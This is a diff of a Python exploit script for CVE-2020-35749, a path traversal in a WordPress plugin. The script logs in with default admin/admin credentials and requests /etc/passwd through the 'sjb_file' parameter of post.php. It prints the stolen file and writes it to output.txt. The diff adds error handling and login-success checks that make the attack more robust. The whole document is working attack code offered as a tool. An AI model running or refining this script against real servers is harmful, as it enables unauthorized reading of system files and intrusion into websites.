@@ -26,9 +26,9 @@ color_random = [
 ]    
 
 def fetch_contents(profile_url):
-    fetch_path = "/etc/passwd"  
-    username = "admin"          
-    password = "admin"          
+    fetch_path = "/etc/passwd" 
+    username = "admin"         
+    password = "admin"         
 
     print(color_random[5] + "[+] Trying to fetch the contents from " + fetch_path)
     time.sleep(3)
@@ -36,29 +36,46 @@ def fetch_contents(profile_url):
     login_url = profile_url + "wp-login.php"
     wp_path = profile_url + 'wp-admin/post.php?post=application_id&action=edit&sjb_file=' + fetch_path
 
-    with requests.Session() as session:
-        headers = {
-            'Cookie': 'wordpress_test_cookie=WP Cookie check',
-            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15'
-        }
+    try:
+        with requests.Session() as session:
+            headers = {
+                'Cookie': 'wordpress_test_cookie=WP Cookie check',
+                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15'
+            }
 
-        post_data = {
-            'log': username,
-            'pwd': password,
-            'wp-submit': 'Log In',
-            'redirect_to': wp_path,
-            'testcookie': '1'
-        }
+            post_data = {
+                'log': username,
+                'pwd': password,
+                'wp-submit': 'Log In',
+                'redirect_to': wp_path,
+                'testcookie': '1'
+            }
 
-        session.post(login_url, headers=headers, data=post_data, verify=False)
-        response = session.get(wp_path)
+            print(color_random[2] + "[+] Logging in to: " + login_url)
+            login_response = session.post(login_url, headers=headers, data=post_data, verify=False)
 
-        with open("output.txt", "w") as out_file:
-            out_file.write(response.text)
+            if login_response.status_code != 200 or 'dashboard' not in login_response.text:
+                print(color_random[6] + "[-] Login failed. Exiting.")
+                return 
 
-        print(color_random[4] + response.text)
-        print(color_random[5] + "\n[+] Output Saved as: output.txt\n")
+            response = session.get(wp_path, headers=headers, verify=False)
+
+            if response.status_code == 200:
+                print(color_random[4] + response.text)
+
+                with open("output.txt", "w") as out_file:
+                    out_file.write(response.text)
+                print(color_random[5] + "\n[+] Output saved as: output.txt\n")
+                return True
+            else:
+                print(color_random[6] + f"[-] Failed to fetch contents. Status code: {response.status_code}")
+                return False
+
+    except Exception as e:
+        print(color_random[6] + f"[!] Error: {e}")
+        return 
 
 def scan_cve_2020_35749(profile_url):
     fetch_contents(profile_url)
+
 
